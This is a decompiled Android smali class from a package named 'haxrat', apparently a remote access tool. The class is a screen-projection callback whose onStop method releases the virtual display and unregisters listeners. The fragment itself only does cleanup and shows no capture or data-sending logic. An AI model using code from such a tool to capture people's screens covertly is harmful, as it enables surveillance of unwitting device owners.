.class Lcom/hax4us/haxrat/Screenshot$100000002;
.super Landroid/media/projection/MediaProjection$Callback;
.source "Screenshot.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/hax4us/haxrat/Screenshot;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x20
    name = "100000002"
.end annotation


# instance fields
.field private final this$0:Lcom/hax4us/haxrat/Screenshot;

.field private final val$imageReader:Landroid/media/ImageReader;

.field private final val$mediaProjection:Landroid/media/projection/MediaProjection;

.field private final val$virtualDisplay:Landroid/hardware/display/VirtualDisplay;


# direct methods
.method constructor <init>(Lcom/hax4us/haxrat/Screenshot;Landroid/hardware/display/VirtualDisplay;Landroid/media/ImageReader;Landroid/media/projection/MediaProjection;)V
    .locals 8

    move-object v0, p0

    move-object v1, p1

    move-object v2, p2

    move-object v3, p3

    move-object v4, p4

    move-object v6, v0

    invoke-direct {v6}, Landroid/media/projection/MediaProjection$Callback;-><init>()V

    move-object v6, v0

    move-object v7, v1

    iput-object v7, v6, Lcom/hax4us/haxrat/Screenshot$100000002;->this$0:Lcom/hax4us/haxrat/Screenshot;

    move-object v6, v0

    move-object v7, v2

    iput-object v7, v6, Lcom/hax4us/haxrat/Screenshot$100000002;->val$virtualDisplay:Landroid/hardware/display/VirtualDisplay;

    move-object v6, v0

    move-object v7, v3

    iput-object v7, v6, Lcom/hax4us/haxrat/Screenshot$100000002;->val$imageReader:Landroid/media/ImageReader;

    move-object v6, v0

    move-object v7, v4

    iput-object v7, v6, Lcom/hax4us/haxrat/Screenshot$100000002;->val$mediaProjection:Landroid/media/projection/MediaProjection;

    return-void
.end method

.method static access$0(Lcom/hax4us/haxrat/Screenshot$100000002;)Lcom/hax4us/haxrat/Screenshot;
    .locals 4

    move-object v0, p0

    move-object v3, v0

    iget-object v3, v3, Lcom/hax4us/haxrat/Screenshot$100000002;->this$0:Lcom/hax4us/haxrat/Screenshot;

    move-object v0, v3

    return-object v0
.end method


# virtual methods
.method public onStop()V
    .locals 5
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    .line 144
    move-object v0, p0

    move-object v2, v0

    invoke-super {v2}, Landroid/media/projection/MediaProjection$Callback;->onStop()V

    .line 145
    move-object v2, v0

    iget-object v2, v2, Lcom/hax4us/haxrat/Screenshot$100000002;->val$virtualDisplay:Landroid/hardware/display/VirtualDisplay;

    if-eqz v2, :cond_0

    .line 146
    move-object v2, v0

    iget-object v2, v2, Lcom/hax4us/haxrat/Screenshot$100000002;->val$virtualDisplay:Landroid/hardware/display/VirtualDisplay;

    invoke-virtual {v2}, Landroid/hardware/display/VirtualDisplay;->release()V

    .line 147
    :cond_0
    move-object v2, v0

    iget-object v2, v2, Lcom/hax4us/haxrat/Screenshot$100000002;->val$imageReader:Landroid/media/ImageReader;

    const/4 v3, 0x0

    check-cast v3, Landroid/media/ImageReader$OnImageAvailableListener;

    const/4 v4, 0x0

    check-cast v4, Landroid/os/Handler;

    invoke-virtual {v2, v3, v4}, Landroid/media/ImageReader;->setOnImageAvailableListener(Landroid/media/ImageReader$OnImageAvailableListener;Landroid/os/Handler;)V

    .line 148
    move-object v2, v0

    iget-object v2, v2, Lcom/hax4us/haxrat/Screenshot$100000002;->val$mediaProjection:Landroid/media/projection/MediaProjection;

    move-object v3, v0

    invoke-virtual {v2, v3}, Landroid/media/projection/MediaProjection;->unregisterCallback(Landroid/media/projection/MediaProjection$Callback;)V

    return-void
.end method
